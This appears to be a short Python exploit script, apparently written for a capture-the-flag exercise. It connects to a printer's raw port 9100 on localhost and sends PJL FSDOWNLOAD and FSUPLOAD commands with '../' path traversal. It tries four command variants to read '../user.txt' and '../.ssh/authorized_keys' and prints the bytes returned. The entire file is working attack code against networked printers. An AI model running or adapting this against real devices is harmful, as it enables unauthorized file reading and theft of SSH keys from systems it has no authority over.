#!/usr/bin/env python3
import socket

def pull(path: str, size: int) -> bytes:
    specs = [
        f'@PJL FSDOWNLOAD NAME="{path}"\r\nSIZE={size}\r\n',
        f'@PJL FSDOWNLOAD NAME="{path}"\r\n',
        f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={size}\r\nOFFSET=0\r\n',
        f'@PJL FSUPLOAD NAME="{path}"\r\nOFFSET=0\r\nSIZE={size}\r\n',
    ]
    for spec in specs:
        s = socket.socket()
        s.settimeout(5)
        s.connect(("127.0.0.1", 9100))
        s.sendall(spec.encode())
        out = b""
        try:
            while len(out) < size + 200:
                c = s.recv(4096)
                if not c:
                    break
                out += c
        except socket.timeout:
            pass
        s.close()
        print("spec", spec.split(chr(10))[0][:60], "len", len(out), repr(out[:120]))


pull("../user.txt", 33)
pull("../.ssh/authorized_keys", 91)